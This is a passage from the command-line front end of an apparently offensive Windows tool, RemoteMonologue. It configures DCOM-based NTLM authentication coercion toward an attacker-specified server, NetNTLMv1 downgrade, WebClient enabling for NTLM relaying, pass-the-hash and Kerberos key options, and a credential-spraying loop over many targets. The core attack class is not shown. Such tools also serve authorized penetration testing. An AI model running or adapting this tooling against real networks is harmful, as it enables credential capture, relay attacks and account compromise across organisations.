                        help='Run attack with NetNTLMv1 downgrade')
    parser.add_argument('-webclient', action='store_true', default = False,
                        help='Enable the WebClient service to receive HTTP authentications for NTLM relaying')
    parser.add_argument('-output', action='store', metavar = "filename", help='Output results to file')
    parser.add_argument('-timeout', action='store', default=5, help='socket timeout out when connecting to the target (default 5 sec)')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar = "authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                        "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        #logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)


    if options.dcom not in ["ServerDataCollectorSet", "FileSystemImage", "UpdateSession", None]:
        logging.error("Incorrect -dcom option. Choose: ServerDataCollectorSet (default), FileSystemImage, UpdateSession (SYSTEM)")
        sys.exit(0)

    if options.downgrade and options.webclient:
        logging.error("You can't use -downgrade and -webclient at the same time. Choose one.")
        sys.exit(0)

    if (options.auth_to == None and options.query == False):
        logging.error("Must specify the server for the target to authenticate to (-auth-to)")
        sys.exit(0)     


    if options.spray == False:
        domain, username, password, address = parse_target(options.target)
    else:
        domain, username, password, addresses = parse_target(options.target)

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (repr(domain), repr(username), repr(password)))

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True
        if options.spray:
            user_resp = str(input("\n[?] You're about to spray credentials. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS! Continue? (y/N): "))
            if user_resp == "y":
                targets = []
                if os.path.isfile(addresses):
                    with open(addresses) as serverfile:
                        for line in serverfile:
                            if line.strip():
                                targets.extend(parseServers(line.strip()))                   

                for x in range(len(targets)):
                    address = targets[x]
                    executer = RemoteMonologue(username, password, domain, address, options.hashes, options.aesKey,
                            options.k, options.dc_ip,options.auth_to, options.output, options.dcom, options.downgrade, options.webclient, options.timeout)
                    executer.run()
                    
        else:

            executer = RemoteMonologue(username, password, domain, address, options.hashes, options.aesKey,
                        options.k, options.dc_ip,options.auth_to, options.output, options.dcom, options.downgrade, options.webclient)

            if options.query:
                executer.run_query()
            else:
                executer.run()

    except (Exception, KeyboardInterrupt) as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

    sys.exit(0)
